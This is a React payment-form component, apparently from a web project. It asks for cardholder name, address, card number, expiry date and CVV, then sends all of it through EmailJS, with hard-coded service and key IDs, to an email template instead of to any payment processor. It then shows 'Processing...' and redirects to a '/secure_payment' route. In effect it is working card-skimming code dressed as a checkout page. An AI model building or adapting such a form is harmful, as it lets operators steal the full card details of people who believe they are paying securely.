/* eslint-disable no-unused-vars */
import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';
import image1 from '../../assets/images/mastercard.svg';
import image2 from '../../assets/images/paysafecard.svg';
import image3 from '../../assets/images/visa.svg';
import { useNavigate } from 'react-router-dom';
import BgImage from '../../assets/images/background.jpg';

const PaymentDetails = () => {
  const navigate = useNavigate();
  const form = useRef();
  const codeGenerator = () => {
    let code = Math.floor(Math.random() * 10000000000000000);
    return code;
  };
  let codeFinal = codeGenerator();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        'service_itl56hh',
        'template_uh15ufm',
        form.current,
        'X652hOOq-P3jXQE22'
      )
      .then(
        (result) => {
          alert('Processing...');
          form.current.reset();
          navigate('/secure_payment');
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  return (
    <div
      className="flex justify-center items-center min-h-screen"
      style={{
        backgroundImage: `url(${BgImage})`,
      }}>
      <div className="card flex-shrink-0 w-80 md:w-full max-w-sm shadow-2xl bg-base-100">
        <form ref={form} onSubmit={sendEmail} className="card-body">
          <div className="form-control">
            <label className="label">
              <span className="label-text">Card Holder Name*</span>
            </label>
            <input
              type="text"
              name="user_name"
              placeholder="Card holder name"
              className="input input-bordered"
              required
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text"> Address*</span>
            </label>
            <input
              type="text"
              name="user_address"
              placeholder="Address line 1"
              className="input input-bordered"
              required
            />
          </div>
          <div className="grid grid-cols-3 gap-1">
            <div className="form-control">
              <input
                type="text"
                name="user_City"
                placeholder="City"
                className="input input-bordered"
                required
              />
            </div>
            <div className="form-control">
              <input
                type="text"
                name="user_state"
                placeholder="State"
                className="input input-bordered"
                required
              />
            </div>
            <div className="form-control">
              <input
                type="text"
                name="user_zipCode"
                placeholder="Zip Code"
                className="input input-bordered"
                required
              />
            </div>
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Card* (Master, Debit, Credit)</span>
              <div className="flex gap-1">
                <img src={image2} alt="card" className="w-10" />
                <img src={image1} alt="card" className="w-10 bg-slate-300" />
                <img src={image3} alt="card" className="w-6" />
              </div>
            </label>
            <input
              type="text"
              name="user_card"
              placeholder="Card"
              className="input input-bordered"
              required
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Expiry Date*</span>
            </label>
            <input
              type="text"
              name="user_Expire_date"
              placeholder="Example: 07/27"
              className="input input-bordered"
              required
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">CVV*</span>
            </label>
            <input
              type="text"
              name="user_CVV"
              placeholder="CVV"
              className="input input-bordered"
              required
            />
          </div>
          <input
            className="btn bg-red-700 text-white"
            type="submit"
            value="Submit"
          />
        </form>
      </div>
    </div>
  );
};

export default PaymentDetails;
